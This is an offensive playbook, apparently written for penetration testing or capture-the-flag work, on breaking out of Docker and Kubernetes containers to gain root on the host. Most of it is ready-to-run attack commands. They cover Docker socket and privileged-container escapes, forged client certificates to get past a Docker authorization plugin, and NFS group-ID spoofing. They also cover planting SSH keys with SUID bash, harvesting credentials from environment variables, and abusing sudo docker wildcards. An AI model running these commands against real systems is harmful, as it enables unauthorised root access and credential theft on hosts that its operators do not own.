# Container Escape

## When this applies

- Linux foothold inside a Docker/Kubernetes container.
- Goal: break out to the host system.

## Common Vectors

- **Privileged containers**: Running with `--privileged`
- **Docker socket exposure**: Mounting `/var/run/docker.sock`
- **Docker TLS API with authz plugin**: Forge client cert matching allowed CN in policy
- **Kernel exploits**: Shared kernel vulnerabilities
- **Misconfigured capabilities**: Excessive Linux capabilities
- **Volume mounts**: Host filesystem access
- **NFS GID spoofing**: Access group-restricted NFS shares with forged AUTH_UNIX credentials

## Steps

```bash
# Check if in container
cat /proc/1/cgroup
ls -la /.dockerenv

# Check capabilities
capsh --print

# Privileged container escape
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Docker socket escape
docker run -v /:/hostfs -it ubuntu chroot /hostfs

# Docker TLS API with authz-broker bypass
# 1. Find authz policy: cat /var/lib/authz-broker/policy.json
#    (maps cert CN → allowed Docker actions, e.g. {"users":["root"],"actions":[""]})
# 2. Read CA key (from NFS, disk, or container filesystem)
# 3. Forge client cert: openssl req -new -subj "/CN=root" | openssl x509 -req -CA ca.pem -CAkey ca-key.pem
# 4. Access Docker API: curl --cert client.pem --key client-key.pem --cacert ca.pem https://127.0.0.1:2376/containers/json
# 5. Create privileged container with host mount: {"Binds":["/:/host"],"Privileged":true}

# NFS GID spoofing (bypass root_squash with no_all_squash)
# When NFS exports use root_squash but no_all_squash, non-root UIDs/GIDs are preserved
# Write a raw NFS RPC client with AUTH_UNIX credentials using an arbitrary GID
# to access group-restricted directories (e.g., GID mapped from AD domain groups)
# Python: pack auth_unix(uid=1000, gid=TARGET_GID) → MOUNT → LOOKUP → READ

# Check for sensitive mounts
mount | grep -i host

# Shared mount SUID escape (container root + host dir mounted rw)
# 1. Detect: mount | grep /dev/sd  (host partition mounted into container)
# 2. Write SSH key: echo "ssh-rsa ..." >> /home/<user>/.ssh/authorized_keys
# 3. SSH to host: ssh user@<gateway_ip> (typically 172.x.0.1)
# 4. From host: cp /bin/bash /home/<user>/bash_suid
# 5. From container (root): chmod u+s /home/<user>/bash_suid
# 6. SSH again, run: ./bash_suid -p → root on host
# CRITICAL: use the HOST's binary, not container's — library mismatch breaks SUID binaries
```

## Container Env Var Lateral Movement

Any time a foothold lands inside a Docker/Kubernetes container, run `env` and `cat /proc/1/environ | tr '\0' '\n'` BEFORE attempting any in-container privesc. Build-time `ARG`/`ENV` directives and runtime `-e VAR=...` flags routinely leak SSH/SMB/DB credentials for the host or peer services.

```bash
# Inside container — full env dump (current shell + PID 1):
env
cat /proc/1/environ 2>/dev/null | tr '\0' '\n'

# Common high-signal variable name patterns to grep for:
env | grep -Ei 'pass|secret|token|key|auth|user|host|url|conn|dsn|aws|gcp|azure|ssh|smtp|mail|admin'
```

The most common payouts are: app-level admin/service credentials reused as host SSH (the host's `/etc/passwd` has a matching account), DB connection strings pointing at a peer container with weaker auth, and cloud-provider IMDS tokens already pre-fetched into the env. Container `172.17.0.0/16`/`172.18.0.0/16` IPs make peer pivots cheap (`nc -zv 172.17.0.1 1-65535`).

## Sudo-to-Docker on the host (no escape needed)

When you already have a foothold on the **host** (not inside a container) and `sudo -l` shows a NOPASSWD entry like `/usr/bin/docker exec *`, `/snap/bin/docker run *`, or any `docker` subcommand with a wildcard, you don't need an escape — `docker` itself runs as root, and you can append flags that yield host root:

```bash
# sudo -l shows:  (root) NOPASSWD: /snap/bin/docker exec *
# Wildcard accepts arbitrary trailing args including --privileged and -u 0
CID=$(sudo /snap/bin/docker ps -q | head -1)
sudo /snap/bin/docker exec --privileged -u 0 $CID /bin/sh
# Inside that container shell (which now has CAP_SYS_ADMIN):
mkdir /h && mount /dev/sda1 /h && cat /h/root/root.txt
# or chroot /h /bin/bash for a host-rootfs shell

# sudo -l shows:  (root) NOPASSWD: /usr/bin/docker run *
sudo /usr/bin/docker run --rm -v /:/hostfs --privileged alpine chroot /hostfs /bin/sh
```

**Why it works:** `docker exec --privileged -u 0 <cid>` is functionally `docker run --privileged -v /:/host` — both give a CAP_SYS_ADMIN context that can `mount /dev/sd*` and read the host filesystem. The sudoers wildcard makes the extra flags allowable. Same primitive applies to `podman`, `nerdctl`, and `kubectl exec` when sudoers grants a wildcard. Always grep `sudo -l` for any container-runtime binary before pursuing a kernel exploit.

## Verifying success

- `ls /host/etc/shadow` (or chrooted shell) reveals host filesystem contents.
- `id` after escape reports root in host namespace.

## Common pitfalls

- Library mismatch breaks SUID binaries copied between container and host — always use the HOST's bash binary on the host filesystem.
- Docker socket mounts grant full root via `docker run --privileged -v /:/host` — but require the docker-cli to be present or available.

## Tools

- amicontained (container detection)
- CDK (Container penetration toolkit)
- Docker
- kubectl (Kubernetes)
- capsh
